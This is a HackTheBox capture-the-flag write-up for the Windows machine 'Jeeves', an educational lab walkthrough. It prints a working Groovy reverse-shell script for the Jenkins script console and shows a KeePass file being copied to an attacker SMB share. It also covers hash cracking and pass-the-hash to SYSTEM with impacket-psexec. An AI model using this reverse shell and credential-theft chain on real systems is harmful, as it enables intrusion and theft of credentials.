
# Jeeves - HackTheBox Writeup

**Difficulty:** Medium  
**OS:** Windows  
**Topics:** Jenkins, KeePass, Pass-the-Hash, NTFS Alternate Data Streams

---

## 1. Reconnaissance – Port Scan

We start with a full port scan & deeper scan after, using Nmap to identify all open ports:

```bash
nmap -sS -T4 --open -p- 10.129.33.138
```
<img width="634" height="275" alt="vmware_rNjdQ79Mp7" src="https://github.com/user-attachments/assets/ca3c342b-0ce3-4db3-8bc0-b1629a880f26" />
<img width="745" height="545" alt="vmware_JDr9YkqJfF" src="https://github.com/user-attachments/assets/abea049a-0d50-4be6-bffd-18ac806bfc7a" />


**Results:** We find 4 relevant ports:

|Port|Service|
|---|---|
|80|HTTP (Webserver)|
|445|SMB|
|135|RPC|
|50000|HTTP (second Webserver)|

---

## 2. Webserver Enumeration

### 2.1 Port 80

Port 80 serves a simple page called "Ask Jeeves" with a broken search function. The source code reveals nothing interesting.

<img width="650" height="327" alt="vmware_wpv0rZQiYz" src="https://github.com/user-attachments/assets/e801eebf-8b93-44b5-ac0c-559c6f31f1b2" />
<img width="1119" height="783" alt="vmware_7YPFTM5RM2" src="https://github.com/user-attachments/assets/289125b8-afc5-44f1-894d-f4037d1f7a94" />
<img width="1065" height="286" alt="vmware_MS2xPROUp3" src="https://github.com/user-attachments/assets/d0f88182-2512-4599-8458-07e949bb1a33" />

### 2.2 Port 50000

Port 50000 initially returns only a **404 error page**. This suggests that there could be anything hidden!

<img width="418" height="299" alt="vmware_M4oLM9WD76" src="https://github.com/user-attachments/assets/49cfc107-d723-4bfe-aaf7-b824bb337063" />

### 2.3 Directory Bruteforce with ffuf

A dictionary attack on port 80 yields no results. On port 50000, however, we discover an interesting path:
```bash
gobuster dir -u http://10.129.33.138:50000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_dicrectory-list-2.3-medium.txt -t 200
```
<img width="1192" height="368" alt="vmware_UxMxU45UpU" src="https://github.com/user-attachments/assets/10246f6b-4311-4446-97c3-1d36f56a29c9" />

**Found:** `/askjeeves` → leads to a **Jenkins** instance with no authentication required.

<img width="1219" height="723" alt="vmware_jbTqVGXkP7" src="https://github.com/user-attachments/assets/59c59729-3c6a-41be-8034-33deb5ecdd67" />


> **What is Jenkins?**  
> Jenkins is an open-source automation server primarily used for CI/CD pipelines. A publicly accessible Jenkins instance without login protection is a critical security risk.

---

## 3. Initial Access – Reverse Shell via Jenkins Script Console

### 3.1 Why is the Jenkins Script Console dangerous?

Jenkins exposes a **Groovy Script Console** at `/script` that executes code directly on the server — with no sandbox. Anyone with access to this console can run arbitrary code on the underlying system.

### 3.2 Reverse Shell

We use the following Groovy code to spawn a reverse shell:

```groovy
String host="10.10.14.15";  // Change to your IP
int port=8044;               // Change to your port
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();Thread.sleep(50);
    try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
```
<img width="878" height="582" alt="vmware_AlqIc5q14a" src="https://github.com/user-attachments/assets/cf5a0f97-5b12-4ee5-abef-f141ef3f954a" />


Start a Netcat listener before clicking Run:


```bash
nc -lvnp 8044
```

After clicking Run we get a shell as `kohsuke`.



---

## 4. User Flag

The user flag is located on the current user's Desktop as usual.

<img width="346" height="114" alt="vmware_6mSsWnkF7F" src="https://github.com/user-attachments/assets/f8b16803-e086-4c0f-be10-8895cfd1f592" />

---

## 5. Privilege Escalation

### 5.1 Enumeration – Jenkins Config File

When we spawned the shell, we landed in the `admin` user's directory but couldn't access it directly. Inside the `.jenkins` folder however, we find an **admin config file** containing a bcrypt-hashed password.

<img width="1093" height="623" alt="vmware_E3LhtMLFgZ" src="https://github.com/user-attachments/assets/235f4205-671c-4927-8f8b-f2a621250dfd" />

### 5.2 Hash Cracking with Hashcat


```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

> `-m 3200` is the Hashcat mode for bcrypt.

While Hashcat is running, we continue enumerating the system.

### 5.3 KeePass Database Found

During further manual enumeration we find a **KeePass database file** (`.kdbx`) on the filesystem. This could contain valuable credentials.

<img width="435" height="208" alt="vmware_hMTPzDmkLQ" src="https://github.com/user-attachments/assets/b838b48b-fb75-413a-9b9e-9e59bf22aeb2" />

### 5.4 Transferring the KeePass File to our AttackBox

We host an SMB share on our AttackBox using Impacket:


```bash
impacket-smbserver <sharename> <directory> -smb2support
```
<img width="360" height="69" alt="vmware_0xua5VUFj3" src="https://github.com/user-attachments/assets/d3a6cc2c-5480-41df-b17c-d2ac44cedf80" />



On the Windows machine we copy the file over:

```cmd
copy CEH.kdbx \\<your_ip>\share
```
<img width="505" height="80" alt="vmware_qgUySlb9w3" src="https://github.com/user-attachments/assets/4c180902-8d67-49cb-a108-892caa90ec0a" />

### 5.5 Cracking the KeePass Database

Since the database is password-protected, we first convert it into a crackable hash format:



```bash
keepass2john CEH.kdbx > CEH.hash
```
<img width="1194" height="98" alt="vmware_PpOQw25IXS" src="https://github.com/user-attachments/assets/c64c79f7-1fa6-422a-9c9d-b9ad6b633986" />


Remove the `CEH:` prefix from the hash file, then run:


```bash
hashcat -m 13400 CEH.hash /usr/share/wordlists/rockyou.txt
```



(you could also specify the --name option behind your hashcat command instead of removing the CEH: prefix)

> `-m 13400` is the Hashcat mode for KeePass databases.

<img width="1226" height="78" alt="vmware_xEIyKPhvIo" src="https://github.com/user-attachments/assets/4a73a7a1-b05c-4bbe-b5d4-01c07d04285c" />

### 5.6 Looting the KeePass Database

Opening the database with **KeePassXC** reveals several credentials. Most notably, the "Backup stuff" entry contains a password that looks like an **NTLM hash** (32 hex characters).

> **NTLM hashes** are used by Windows for password storage. The key insight here: they don't need to be cracked — they can be used directly for authentication via Pass-the-Hash.

---

## 6. Pass-the-Hash as Administrator

### 6.1 Validating the NTLM Hash

We test whether the found hash is valid for the `administrator` account:

```bash
netexec smb 10.129.33.138 -u administrator -H <hash>
```
<img width="1146" height="117" alt="vmware_GunnmpdSqR 1" src="https://github.com/user-attachments/assets/e3d5b8ba-65be-4b8e-90e0-ae26c39af589" />

Success — the hash is valid!

### 6.2 Shell as SYSTEM

Using Impacket's `psexec` we get a shell with the highest privileges:


```bash
impacket-psexec administrator@10.129.33.138 -hashes <hash>
```
<img width="1017" height="289" alt="vmware_AUMr0R6ij7" src="https://github.com/user-attachments/assets/cad06e4c-6452-4f64-bb3e-deed1a2f1479" />

We are now `NT AUTHORITY\SYSTEM`.

---

## 7. Root Flag – NTFS Alternate Data Streams

### 7.1 The Problem

On the Administrator's Desktop there is no `root.txt` — instead we find a file called `hm.txt` with the message:  
_"The flag is elsewhere. Look deeper."_

<img width="379" height="64" alt="vmware_th2cOwqr5f" src="https://github.com/user-attachments/assets/1096ca2a-d9b4-4547-9cd8-ef0b22b5136a" />

### 7.2 What are NTFS Alternate Data Streams?

**NTFS Alternate Data Streams (ADS)** are a feature of the Windows NTFS filesystem. A file can carry multiple hidden data streams alongside its main content (the "Default Data Stream"). These streams are invisible to standard tools like `dir` or `type`, making them useful for hiding data.

Syntax: `filename.txt:hidden_stream`

### 7.3 Revealing and Reading ADS

The `/r` flag on `dir` makes Alternate Data Streams visible:


```cmd
dir /r
```
<img width="595" height="240" alt="vmware_FltUBoiBYh" src="https://github.com/user-attachments/assets/85a95187-f765-4f2c-888e-19366d38e0d5" />

We can see `hm.txt:root.txt` — the flag is embedded as a hidden stream inside `hm.txt`.

To read it we use `more`:


```cmd
more < hm.txt:root.txt
```
<img width="466" height="62" alt="vmware_IbpX4uMeQS" src="https://github.com/user-attachments/assets/22995bb8-4175-4a95-84f1-8b5bf910c2d7" />



**Root flag obtained!**

---


